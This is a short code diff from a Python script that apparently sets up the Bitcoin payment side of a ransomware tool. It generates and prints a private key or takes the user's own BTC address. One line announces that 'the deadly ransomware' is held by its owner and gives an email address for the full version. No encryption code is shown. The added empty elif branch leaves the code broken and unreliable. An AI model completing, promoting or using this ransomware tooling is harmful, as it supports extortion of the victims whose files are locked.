@@ -117,6 +117,7 @@ if input_1==1:
                 print("Privkey: " + getWif(randomBytes))
                 print("")
                 print('*'*100)
+                t_o_1=getPublicKey(randomBytes)
         elif t_o==1:
             t_o_1=input("Please enter your own BTC address : ")
             print("Is this right [1 : TO CONFIRM] [2: To Re-enter]: ",t_o_1,end='')
@@ -135,5 +136,7 @@ if input_1==1:
         if n_d==2:
             print('THIS IS A PUBLIC VERSION , THE DEADLY RANSOMWARE IS WITH OWNER')
             print("email to : dwecloud@gmail.com to get the full  version")
+        elif n_d==1:
+
 else:
     print("bye")
